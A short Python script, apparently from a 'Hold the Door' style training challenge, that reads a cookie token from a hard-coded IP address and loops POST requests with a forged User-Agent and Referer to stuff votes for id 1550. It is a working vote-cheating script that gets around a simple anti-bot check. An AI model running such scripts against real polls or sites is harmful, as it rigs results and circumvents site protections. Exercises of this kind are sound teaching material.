#!/usr/bin/python3

"""
Level 2
"""
import requests


def cheat_vote_Level_0(times):
    """
    cheat_vote_Level_1 - program that votes 4096 times for your id
    times - number of times voted
    """
    succes = 0
    failures = 0

    url = "http://158.69.76.135/level2.php"

    rq = requests.get(url)

    key = rq.cookies['HoldTheDoor']
    my_data = {'id': '1550', 'holdthedoor': 'Submit', 'key': key}
    cookie = {'HoldTheDoor': key}
    header_UA = {"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0)\
 Gecko/20100101 Firefox/73.0"}
    header = {'User-Agent': header_UA, 'Referer': url}

    for i in range(times):
        rq = requests.post(url, data=my_data, cookies=cookie, headers=header)
        if (rq.status_code == 200):
            print("vote {:d}".format(succes))
            succes += 1
        else:
            print('Failure!')
            failures += 1
    rq = requests.get(url)
    print('=============================')
    print("\nYou Id {}".format(my_data['id']))
    print('=============================')
    print('SUCCESS!! [{:d}]'.format(succes))
    print('=============================')
    print('FAILURES [{:d}]'.format(failures))
    print('=============================')
    print(rq.json)
    print('==============================')
    print('Headers')
    print(rq.headers)


if __name__ == '__main__':
    times = 10
    cheat_vote_Level_0(times)
